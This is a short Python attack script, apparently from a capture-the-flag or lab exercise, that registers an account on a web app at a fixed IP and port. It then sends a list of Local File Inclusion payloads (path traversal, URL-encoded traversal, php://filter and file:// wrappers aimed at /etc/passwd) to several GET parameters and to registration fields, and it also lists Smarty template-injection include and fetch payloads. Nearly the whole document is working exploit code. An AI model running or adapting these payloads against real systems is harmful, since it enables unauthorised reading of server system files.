#!/usr/bin/env python3
"""
Probar LFI (Local File Inclusion) en diferentes endpoints
"""
import requests
import random
import string

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

data = {'name': 'user1', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Probar LFI en diferentes parámetros
lfi_payloads = [
    "../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://filter/read=string.rot13/resource=/etc/passwd",
    "file:///etc/passwd",
]

endpoints_to_test = [
    ("/?file=", "GET file parameter"),
    ("/?page=", "GET page parameter"),
    ("/?template=", "GET template parameter"),
    ("/?path=", "GET path parameter"),
]

for endpoint, desc in endpoints_to_test:
    for payload in lfi_payloads:
        url = f"{TARGET}{endpoint}{payload}"
        try:
            resp = session.get(url, timeout=5)
            if "root:" in resp.text or "bin/bash" in resp.text:
                print(f"[+++] LFI found! {desc} with payload: {payload}")
                print(f"      Response: {resp.text[:200]}")
                break
        except:
            pass

# Probar si puedo leer archivos via el nombre de usuario o password
print("\n[*] Probando LFI via parámetros de registro...")
for payload in ["../../../etc/passwd", "php://filter/convert.base64-encode/resource=/etc/passwd"]:
    s = requests.Session()
    try:
        data = {
            'name': 'test',
            'username': payload,
            'password': 'pass'
        }
        resp = s.post(f"{TARGET}/register.php", data=data, timeout=5)
        if "root:" in resp.text:
            print(f"[+++] LFI via username: {payload}")
    except:
        pass

# Probar si Smarty tiene alguna función de inclusión
print("\n[*] Probando inclusión via Smarty...")
smarty_include_payloads = [
    "{include file='/etc/passwd'}",
    "{include file='../../../../etc/passwd'}",
    "{fetch file='/etc/passwd'}",
]

# No puedo inyectar en Smarty sin cambiar el nombre primero...
# Pero puedo intentar via otros campos

print("[*] No puedo probar inclusión Smarty sin cambiar nombre primero")
